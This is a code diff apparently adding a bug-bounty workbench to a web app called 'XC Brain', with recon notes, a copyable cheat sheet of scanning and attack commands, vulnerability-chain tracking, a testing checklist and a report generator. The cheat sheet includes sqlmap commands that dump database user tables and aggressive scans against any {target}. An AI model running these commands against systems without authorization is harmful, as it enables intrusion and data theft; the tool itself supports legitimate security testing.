+  const target=document.getElementById('r-target').value.trim();
+  const data=document.getElementById('r-data').value.trim();
+  if(!target||!data){toast('Fill target + data');return;}
+  HH.recon.push({id:Date.now(),target,data,type:document.getElementById('r-type').value,date:new Date().toISOString()});
+  document.getElementById('r-target').value='';document.getElementById('r-data').value='';
+  reconAddOpen=false;document.getElementById('reconAddRow').style.display='none';
+  saveHH();renderRecon();toast('Recon saved');
+}
+function delRecon(id){HH.recon=HH.recon.filter(r=>r.id!==id);saveHH();renderRecon();}
+
+// ── TOOL CHEATSHEET ──
+const TOOLS=[
+  {name:'nmap',cat:'Discovery',cmds:[
+    'nmap -sV -sC -p- {target}',
+    'nmap -sU --top-ports 100 {target}',
+    'nmap -A -T4 {target}',
+    'nmap --script vuln {target}',
+    'nmap -p 80,443,8080,8443 {target}',
+  ]},
+  {name:'subfinder',cat:'Recon',cmds:[
+    'subfinder -d {target} -o subs.txt',
+    'subfinder -d {target} -all -recursive',
+    'subfinder -d {target} | httpx -silent',
+  ]},
+  {name:'httpx',cat:'Recon',cmds:[
+    'httpx -l subs.txt -sc -title -tech-detect',
+    'httpx -l subs.txt -mc 200,301,302',
+    'echo {target} | httpx -probe',
+    'httpx -u {target} -json -o out.json',
+  ]},
+  {name:'ffuf',cat:'Fuzzing',cmds:[
+    'ffuf -u https://{target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt',
+    'ffuf -u https://{target}/api/FUZZ -w wordlist.txt -mc 200',
+    'ffuf -u https://{target}/?FUZZ=test -w params.txt',
+    'ffuf -u https://{target}/FUZZ -w words.txt -e .php,.html,.bak -fc 404',
+  ]},
+  {name:'nuclei',cat:'Scanner',cmds:[
+    'nuclei -u {target} -severity critical,high',
+    'nuclei -l subs.txt -t cves/',
+    'nuclei -u {target} -t exposures/ -t vulnerabilities/',
+    'nuclei -u {target} -tags xss,sqli,ssrf',
+  ]},
+  {name:'sqlmap',cat:'SQLi',cmds:[
+    "sqlmap -u 'https://{target}/page?id=1' --dbs",
+    "sqlmap -u 'https://{target}/page?id=1' -D db -T users --dump",
+    "sqlmap -u 'https://{target}/login' --data='user=a&pass=b' --level=5",
+    "sqlmap -r request.txt --batch --risk=3",
+  ]},
+  {name:'gobuster',cat:'Fuzzing',cmds:[
+    'gobuster dir -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/common.txt',
+    'gobuster dns -d {target} -w subdomains.txt',
+    'gobuster vhost -u https://{target} -w vhosts.txt',
+  ]},
+  {name:'amass',cat:'Recon',cmds:[
+    'amass enum -d {target} -o amass.txt',
+    'amass enum -passive -d {target}',
+    'amass intel -d {target} -whois',
+  ]},
+  {name:'gau',cat:'Recon',cmds:[
+    'gau {target} | tee urls.txt',
+    'gau {target} | grep "\\?"',
+    'gau --subs {target} | uro | tee allurls.txt',
+  ]},
+  {name:'waybackurls',cat:'Recon',cmds:[
+    'waybackurls {target} | tee wb.txt',
+    'waybackurls {target} | grep "\\.js$"',
+    'waybackurls {target} | grep "\\?" | uro',
+  ]},
+  {name:'nikto',cat:'Scanner',cmds:[
+    'nikto -h https://{target}',
+    'nikto -h https://{target} -Tuning 4',
+    'nikto -h https://{target} -ssl',
+  ]},
+  {name:'whatweb',cat:'Recon',cmds:[
+    'whatweb https://{target}',
+    'whatweb -a 3 https://{target}',
+    'whatweb -i subs.txt --log-brief=out.txt',
+  ]},
+  {name:'wfuzz',cat:'Fuzzing',cmds:[
+    'wfuzz -c -z file,wordlist.txt --hc 404 https://{target}/FUZZ',
+    'wfuzz -c -z file,params.txt -d "id=FUZZ" https://{target}/api',
+  ]},
+  {name:'dirb',cat:'Fuzzing',cmds:[
+    'dirb https://{target}',
+    'dirb https://{target} /usr/share/wordlists/dirb/big.txt',
+  ]},
+];
+let toolFilter='';
+function renderTools(){
+  const q=toolFilter.toLowerCase();
+  const filtered=TOOLS.filter(t=>!q||t.name.includes(q)||t.cat.toLowerCase().includes(q)||t.cmds.some(c=>c.toLowerCase().includes(q)));
+  document.getElementById('toolGrid').innerHTML=filtered.map(t=>`
+    <div class="tcrd">
+      <div class="tcrd-head">
+        <span class="tcrd-name">${esc(t.name)}</span>
+        <span class="tcrd-cat">${esc(t.cat)}</span>
+      </div>
+      <div class="tcrd-body">
+        ${t.cmds.map((cmd,i)=>`
+        <div class="tcmd" onclick="cpTool('${esc(t.name+i)}','${esc(cmd).replace(/'/g,"\\'")}')">
+          <span class="tcmd-txt">${esc(cmd)}</span>
+          <span class="tcmd-cp" id="tcp${esc(t.name+i)}">⎘</span>
+        </div>`).join('')}
+      </div>
+    </div>`).join('');
+}
+function filterTools(){toolFilter=document.getElementById('toolSearch').value;renderTools();}
+function cpTool(id,cmd){navigator.clipboard?.writeText(cmd);const el=document.getElementById('tcp'+id);if(el){el.textContent='✓';setTimeout(()=>el.textContent='⎘',1800);}toast('Command copied');}
+
+// ── VULN CHAINS ──
+let chainStepsTemp=[];
+function renderChains(){
+  document.getElementById('chainsList').innerHTML=HH.chains.length?HH.chains.map(c=>`
+    <div class="chain-card">
+      <div class="chain-head">
+        <div><div class="chain-name">${esc(c.name)}</div><div style="font-family:var(--mono);font-size:10px;color:var(--tx3);">${esc(c.target)}</div></div>
+        <span class="chain-sev s${c.sev[0]}">${c.sev}</span>
+        <button onclick="delChain(${c.id})" class="kdl" style="margin-left:auto;">✕</button>
+      </div>
+      <div class="chain-steps">${c.steps.map((s,i)=>`${i>0?'<span class="chain-arrow">→</span>':''}<span class="chain-step">${esc(s)}</span>`).join('')}</div>
+      <div class="chain-impact">${esc(c.impact)}</div>
+    </div>`).join(''):'<div class="empty">No chains yet — build one above</div>';
+  renderChainSteps();
+}
+function renderChainSteps(){
+  document.getElementById('chainStepsInp').innerHTML=chainStepsTemp.map((s,i)=>`
+    <span class="chain-step-inp">${esc(s)}<button onclick="rmChainStep(${i})">✕</button></span>
+    ${i<chainStepsTemp.length-1?'<span style="color:var(--tx3);font-size:11px;">→</span>':''}`).join('');
+}
+function pushChainStep(){const v=document.getElementById('cn-step').value.trim();if(!v)return;chainStepsTemp.push(v);document.getElementById('cn-step').value='';renderChainSteps();}
+function rmChainStep(i){chainStepsTemp.splice(i,1);renderChainSteps();}
+function saveChain(){
+  const name=document.getElementById('cn-name').value.trim();
+  if(!name||chainStepsTemp.length===0){toast('Name + at least 1 step required');return;}
+  HH.chains.push({id:Date.now(),name,target:document.getElementById('cn-target').value.trim(),sev:document.getElementById('cn-sev').value,steps:[...chainStepsTemp],impact:document.getElementById('cn-impact').value.trim()});
+  chainStepsTemp=[];
+  document.getElementById('cn-name').value='';document.getElementById('cn-target').value='';document.getElementById('cn-impact').value='';
+  saveHH();renderChains();toast('Chain saved');
+}
+function delChain(id){HH.chains=HH.chains.filter(c=>c.id!==id);saveHH();renderChains();}
+
+// ── METHODOLOGY ──
+const METH_CATS=[
+  {id:'recon',name:'Recon',items:['DNS enumeration','Subdomain discovery','Port scanning','Tech stack detection','WAF detection','SSL/TLS analysis','Wayback machine review','JS file analysis','GitHub/GitLab search']},
+  {id:'authn',name:'Authentication',items:['Default creds test','Brute force protection','Password reset flow','Account lockout','OAuth misconfig','JWT analysis','SSO bypass','MFA bypass']},
+  {id:'authz',name:'Authorization',items:['IDOR on object IDs','Horizontal privilege escalation','Vertical privilege escalation','BOLA testing','Missing function-level auth','UUID/GUID predictability','Mass assignment']},
+  {id:'injection',name:'Injection',items:['SQL injection','NoSQL injection','Command injection','LDAP injection','SSTI','XXE','XPath injection','Header injection']},
+  {id:'xss',name:'XSS',items:['Reflected XSS','Stored XSS','DOM-based XSS','CSP bypass','CSRF via XSS','Blind XSS (notify.run)']},
+  {id:'misc',name:'Business Logic',items:['Race condition','Price manipulation','Negative quantity','Workflow bypass','Email verif bypass','2FA timing attack','Mass data exposure']},
+  {id:'infra',name:'Infrastructure',items:['SSRF to internal','Cloud metadata access','Open redirect','Subdomain takeover','CORS misconfiguration','HTTP request smuggling','Cache poisoning']},
+  {id:'api',name:'API',items:['Exposed swagger/OpenAPI','GraphQL introspection','Broken object auth','Verb tampering','API versioning bypass','Rate limiting absent','Token in URL params']},
+];
+function renderMethodology(){
+  if(!HH.methodology)HH.methodology={};
+  document.getElementById('methWrap').innerHTML=METH_CATS.map(cat=>{
+    const done=(HH.methodology[cat.id]||[]).length;
+    const total=cat.items.length;
+    const pct=total?Math.round(done/total*100):0;
+    return`<div class="meth-cat">
+      <div class="meth-cat-head">
+        <span class="meth-cat-name">${esc(cat.name)}</span>
+        <span class="meth-prog">${done}/${total}</span>
+      </div>
+      <div class="meth-bar-wrap"><div class="meth-bar" style="width:${pct}%"></div></div>
+      ${cat.items.map((item,i)=>{
+        const checked=(HH.methodology[cat.id]||[]).includes(i);
+        return`<div class="meth-item${checked?' done':''}" onclick="togMeth('${cat.id}',${i})">
+          <input type="checkbox" ${checked?'checked':''} onclick="event.stopPropagation();togMeth('${cat.id}',${i})">
+          <span class="meth-item-label">${esc(item)}</span>
+        </div>`;
+      }).join('')}
+    </div>`;
+  }).join('');
+}
+function togMeth(catId,idx){
+  if(!HH.methodology[catId])HH.methodology[catId]=[];
+  const a=HH.methodology[catId];
+  const i=a.indexOf(idx);
+  if(i>=0)a.splice(i,1);else a.push(idx);
+  saveHH();renderMethodology();
+}
+function resetMethodology(){if(!confirm('Reset all methodology checkboxes?'))return;HH.methodology={};saveHH();renderMethodology();toast('Reset done');}
+
+// ── SESSIONS ──
+let sessAddOpen=false;
+function renderSessions(){
+  document.getElementById('sessGrid').innerHTML=HH.sessions.length?HH.sessions.slice().reverse().map(s=>`
+    <div class="sess-card">
+      <div class="sess-head">
+        <span class="sess-target">${esc(s.target)}</span>
+        <span class="sess-date">${esc(s.date)}</span>
+        <button onclick="delSession(${s.id})" class="kdl" style="margin-left:6px;">✕</button>
+      </div>
+      <div style="margin-bottom:5px;"><span class="rtag">${esc(s.type)}</span></div>
+      <div class="sess-notes-txt">${esc(s.notes)}</div>
+      ${s.tags&&s.tags.length?`<div class="sess-tags">${s.tags.map(t=>`<span class="rtag">${esc(t)}</span>`).join('')}</div>`:''}
+    </div>`).join(''):'<div class="empty">No sessions logged yet</div>';
+}
+function toggleSessAdd(){
+  sessAddOpen=!sessAddOpen;
+  document.getElementById('sessAddBox').style.display=sessAddOpen?'block':'none';
+  if(sessAddOpen)document.getElementById('ss-date').value=new Date().toISOString().split('T')[0];
+}
+function saveSession(){
+  const target=document.getElementById('ss-target').value.trim();
+  const notes=document.getElementById('ss-notes').value.trim();
+  if(!target||!notes){toast('Target + notes required');return;}
+  const tagsRaw=document.getElementById('ss-tags').value.trim();
+  const tags=tagsRaw?tagsRaw.split(/\s+/).map(t=>t.replace(/^#/,'')).filter(Boolean):[];
+  HH.sessions.push({id:Date.now(),target,date:document.getElementById('ss-date').value||td(),type:document.getElementById('ss-type').value,notes,tags});
+  document.getElementById('ss-target').value='';document.getElementById('ss-notes').value='';document.getElementById('ss-tags').value='';
+  sessAddOpen=false;document.getElementById('sessAddBox').style.display='none';
+  saveHH();renderSessions();toast('Session logged');
+}
+function delSession(id){HH.sessions=HH.sessions.filter(s=>s.id!==id);saveHH();renderSessions();}
+
+// ── REPORT GENERATOR ──
+function buildHackReport(){
+  const g=id=>document.getElementById(id).value.trim();
+  const target=g('rp-target'),title=g('rp-title'),sev=g('rp-sev'),cvss=g('rp-cvss');
+  const endpoint=g('rp-endpoint'),desc=g('rp-desc'),steps=g('rp-steps'),impact=g('rp-impact'),poc=g('rp-poc'),fix=g('rp-fix');
+  const now=new Date().toISOString().split('T')[0];
+  let r=`BUG BOUNTY REPORT\n${'='.repeat(50)}\n\n`;
+  r+=`Date      : ${now}\n`;
+  r+=`Target    : ${target||'—'}\n`;
+  r+=`Title     : ${title||'—'}\n`;
+  r+=`Severity  : ${sev}\n`;
+  if(cvss)r+=`CVSS      : ${cvss}\n`;
+  if(endpoint)r+=`Endpoint  : ${endpoint}\n`;
+  r+=`\n${'─'.repeat(50)}\nDESCRIPTION\n${'─'.repeat(50)}\n${desc||'—'}\n`;
+  if(steps){r+=`\nSTEPS TO REPRODUCE\n${'─'.repeat(50)}\n${steps}\n`;}
+  if(poc){r+=`\nPROOF OF CONCEPT\n${'─'.repeat(50)}\n${poc}\n`;}
+  if(impact){r+=`\nIMPACT\n${'─'.repeat(50)}\n${impact}\n`;}
+  if(fix){r+=`\nREMEDIATION\n${'─'.repeat(50)}\n${fix}\n`;}
+  r+=`\n${'='.repeat(50)}\nGenerated by XC Brain — ${new Date().toLocaleString()}\n`;
+  document.getElementById('rpOut').textContent=r;
+  toast('Report generated');
+}
+function copyHackReport(){navigator.clipboard?.writeText(document.getElementById('rpOut').textContent);toast('Report copied');}
+function clearHackReport(){['rp-target','rp-title','rp-cvss','rp-endpoint','rp-desc','rp-steps','rp-impact','rp-poc','rp-fix'].forEach(id=>document.getElementById(id).value='');document.getElementById('rpOut').textContent='// Fill the form and click Generate Report…';toast('Cleared');}
 
 // ── TOAST ──
 let toastT;
